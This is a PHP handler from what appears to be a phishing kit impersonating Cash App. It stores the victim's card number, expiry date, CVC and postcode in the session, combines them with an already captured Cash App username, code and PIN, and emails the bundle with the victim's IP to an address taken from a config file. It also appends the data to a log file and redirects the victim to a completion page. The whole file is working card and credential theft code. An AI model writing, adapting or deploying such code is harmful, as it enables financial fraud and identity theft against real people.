<?php 
session_start();
include 'CONFIG_XS.php';
if (isset($_POST['ccnumber'])){
$_SESSION["id_00bc4b79dfc3448eb29a5371f1b8b687_Model_ccnumber"] = $_POST['ccnumber'];
$_SESSION["id_00bc4b79dfc3448eb29a5371f1b8b687_Model_expiration"] = $_POST['expiration'];
$_SESSION["id_00bc4b79dfc3448eb29a5371f1b8b687_Model_securityCode"] = $_POST['securityCode'];
$_SESSION["id_00bc4b79dfc3448eb29a5371f1b8b687_Model_Postcode"] = $_POST['Postcode'];
$DT = date("Y/m/d h:i:s:A");


$headers .= "FROM: CASH-APP<team>";
		

$suj = "[CARD-CASHAPP] - ". $_SESSION['id_00bc4b79dfc3448eb29a5371f1b8b687_Model_UserName'] ." - " . $_SERVER['REMOTE_ADDR'] . " ";
$msgm = "
CashAPP USER     : " . $_SESSION['id_00bc4b79dfc3448eb29a5371f1b8b687_Model_UserName'] . "
CashAPP CODE     : " . $_SESSION['id_00bc4b79dfc3448eb29a5371f1b8b687_Model_code'] . "
CashAPP PIN     : " . $_SESSION['id_00bc4b79dfc3448eb29a5371f1b8b687_Model_pin'] . "
CashCARD NUM     : " . $_POST['ccnumber'] . "
CashCARD EXP     : " . $_POST['expiration'] . "
CashCARD CVC     : " . $_POST['securityCode'] . "
CashCARD ZIP     : " . $_POST['Postcode'] . "
IP            : " . $_SERVER['REMOTE_ADDR'] . "
TIME          : " . $DT . "
";
mail($TO, $suj, $msgm, $headers);
$msg = "
USERNAME : " . $_SESSION['id_00bc4b79dfc3448eb29a5371f1b8b687_Model_UserName'] . "
CashAPP CODE : " . $_SESSION['id_00bc4b79dfc3448eb29a5371f1b8b687_Model_code'] . "
CashAPP PIN : " . $_SESSION['id_00bc4b79dfc3448eb29a5371f1b8b687_Model_pin'] . "
CashCARD NUM : " . $_POST['ccnumber'] . "
CashCARD EXP : " . $_POST['expiration'] . "
CashCARD CVC : " . $_POST['securityCode'] . "
CashCARD ZIP : " . $_POST['Postcode'] . "
IP : " . $_SERVER['REMOTE_ADDR'] . "
TIME : " . $DT ." " ; 
$myfile = fopen("../log.txt", "a");
fwrite($myfile, $msg);
fclose($myfile);		

header("Location: ../done.php");	
}
?>